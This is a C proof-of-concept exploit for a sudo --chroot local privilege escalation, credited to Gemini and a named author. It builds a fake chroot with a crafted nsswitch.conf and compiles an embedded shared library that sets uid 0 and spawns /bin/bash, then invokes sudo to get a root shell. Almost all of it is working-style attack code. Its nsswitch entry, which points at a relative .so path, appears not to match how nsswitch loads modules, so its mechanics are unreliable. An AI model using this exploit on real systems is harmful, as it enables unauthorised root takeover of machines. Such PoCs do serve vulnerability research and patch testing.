/*
 * =====================================================================================
 *
 * Filename:  cve-2025-32463-poc.c
 *
 * Description:  Proof of Concept for CVE-2025-32463 Sudo chroot LPE
 * This vulnerability allows a local user to escalate privileges to root
 * if they are allowed to run commands with sudo's --chroot option.
 * The exploit works by creating a fake chroot environment containing a
 * malicious nsswitch.conf and a shared library. When sudo is run with
 * the --chroot option, it loads the malicious nsswitch.conf, which in
 * turn loads our malicious shared library, giving us code execution
 * as root.
 *
 * Version:  1.0
 * Created:  07/03/2025 04:00:00 PM
 * Revision:  init
 * Compiler:  gcc
 *
 * Author:  Gemini and Charles Majola
 * Organization:  Google and Perosnal Projects
 *
 * =====================================================================================
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>

// This is the C code for the malicious shared library that will be created and compiled.
const char* malicious_lib_code =
    "#include <stdio.h>\n"
    "#include <stdlib.h>\n"
    "#include <unistd.h>\n\n"
    "void __attribute__((constructor)) init() {\n"
    "    printf(\"[+] We are root!\\n\");\n"
    "    setuid(0);\n"
    "    setgid(0);\n"
    "    char* const argv[] = {\"/bin/bash\", NULL};\n"
    "    execve(\"/bin/bash\", argv, NULL);\n"
    "}\n";

int main(int argc, char *argv[]) {
    printf("[*] CVE-2025-32463 Sudo chroot LPE PoC\n");

    // 1. Create a directory to be our chroot environment
    char* chroot_dir = "/tmp/chroot_poc";
    printf("[*] Creating chroot directory at %s\n", chroot_dir);
    if (mkdir(chroot_dir, 0755) != 0) {
        perror("[-] Failed to create chroot directory");
        // Try to remove it if it exists and try again
        system("rm -rf /tmp/chroot_poc");
        if (mkdir(chroot_dir, 0755) != 0) {
            perror("[-] Failed to create chroot directory on second attempt");
            return 1;
        }
    }

    // 2. Create an 'etc' directory inside our chroot environment
    char etc_dir[256];
    snprintf(etc_dir, sizeof(etc_dir), "%s/etc", chroot_dir);
    printf("[*] Creating etc directory at %s\n", etc_dir);
    if (mkdir(etc_dir, 0755) != 0) {
        perror("[-] Failed to create etc directory");
        return 1;
    }

    // 3. Create our malicious nsswitch.conf
    char nsswitch_path[256];
    snprintf(nsswitch_path, sizeof(nsswitch_path), "%s/nsswitch.conf", etc_dir);
    printf("[*] Creating malicious nsswitch.conf at %s\n", nsswitch_path);
    FILE* nsswitch_file = fopen(nsswitch_path, "w");
    if (nsswitch_file == NULL) {
        perror("[-] Failed to create nsswitch.conf");
        return 1;
    }
    // This tells sudo to load our malicious library for the 'hosts' database
    fprintf(nsswitch_file, "hosts: files [NOTFOUND=return] dns ../../tmp/chroot_poc/malicious_lib.so\n");
    fclose(nsswitch_file);

    // 4. Create the source code for our malicious shared library
    char lib_source_path[256];
    snprintf(lib_source_path, sizeof(lib_source_path), "%s/malicious_lib.c", chroot_dir);
    printf("[*] Creating malicious library source at %s\n", lib_source_path);
    FILE* lib_source_file = fopen(lib_source_path, "w");
    if (lib_source_file == NULL) {
        perror("[-] Failed to create malicious library source");
        return 1;
    }
    fprintf(lib_source_file, "%s", malicious_lib_code);
    fclose(lib_source_file);

    // 5. Compile the malicious shared library
    char compile_command[512];
    snprintf(compile_command, sizeof(compile_command), "gcc -shared -fPIC -o %s/malicious_lib.so %s", chroot_dir, lib_source_path);
    printf("[*] Compiling malicious library with: %s\n", compile_command);
    if (system(compile_command) != 0) {
        fprintf(stderr, "[-] Failed to compile malicious library\n");
        return 1;
    }

    // 6. Execute sudo with the --chroot option
    printf("[*] Attempting to execute sudo with chroot. If the system is vulnerable, you should get a root shell.\n");
    printf("[*] The sudoers file must allow you to use the --chroot option.\n");
    printf("[*] Example sudoers entry: your_user ALL=(ALL) ALL, (ALL) CHROOT:/\n");

    char sudo_command[512];
    snprintf(sudo_command, sizeof(sudo_command), "sudo -R %s /bin/true", chroot_dir);
    printf("[*] Executing: %s\n", sudo_command);
    system(sudo_command);

    // Clean up
    printf("[*] Cleaning up created files and directories.\n");
    char cleanup_command[256];
    snprintf(cleanup_command, sizeof(cleanup_command), "rm -rf %s", chroot_dir);
    system(cleanup_command);


    return 0;
}
